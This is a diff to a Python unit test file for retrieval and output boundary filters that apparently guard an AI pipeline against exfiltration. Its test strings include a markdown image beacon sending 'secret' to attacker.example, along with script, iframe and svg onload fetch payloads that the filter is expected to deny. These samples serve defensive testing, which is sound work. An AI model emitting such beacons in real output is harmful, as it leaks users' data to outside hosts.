@@ -50,6 +50,12 @@ class RetrievalBoundaryTests(unittest.TestCase):
         with self.assertRaises(ContentBoundaryError):
             filter_retrieval([], authority=self.authority, max_total_characters=-1)
 
+    def test_retrieval_budgets_reject_non_integer_values(self):
+        with self.assertRaises(ContentBoundaryError):
+            filter_retrieval([], authority=self.authority, max_documents=1.5)
+        with self.assertRaises(ContentBoundaryError):
+            filter_retrieval([], authority=self.authority, max_total_characters=True)
+
     def test_tampered_content_or_trust_label_is_rejected(self):
         valid = self.authority.issue("a", "kb", "content")
         tampered = ProvenancedDocument(
@@ -73,6 +79,16 @@ class RetrievalBoundaryTests(unittest.TestCase):
 
 
 class OutputBoundaryTests(unittest.TestCase):
+    def test_configuration_rejects_scalar_strings_and_malformed_values(self):
+        with self.assertRaises(ValueError):
+            OutputBoundary(allowed_link_hosts="docs.example")
+        with self.assertRaises(ValueError):
+            OutputBoundary(sensitive_values="known-secret")
+        with self.assertRaises(ValueError):
+            OutputBoundary(max_output_characters=True)
+        with self.assertRaises(ValueError):
+            OutputBoundary(allowed_link_hosts=("user@docs.example",))
+
     def test_remote_markdown_image_beacon_is_denied(self):
         result = OutputBoundary().inspect("Result ![x](https://attacker.example/pixel?d=secret)")
         self.assertFalse(result.allowed)
@@ -84,8 +100,6 @@ class OutputBoundaryTests(unittest.TestCase):
             '<img src="https://attacker.example/x">',
             '<script src="https://attacker.example/x"></script>',
             '<iframe src="https://attacker.example/x"></iframe>',
-            '<svg onload="fetch(\'https://attacker.example/x\')"></svg>',
-            '<img src="data:image/svg+xml,blocked">',
             '<svg onload="fetch(\'https://attacker.example/x\')"></svg>',
             '<img src="data:image/svg+xml,blocked">',
         ):
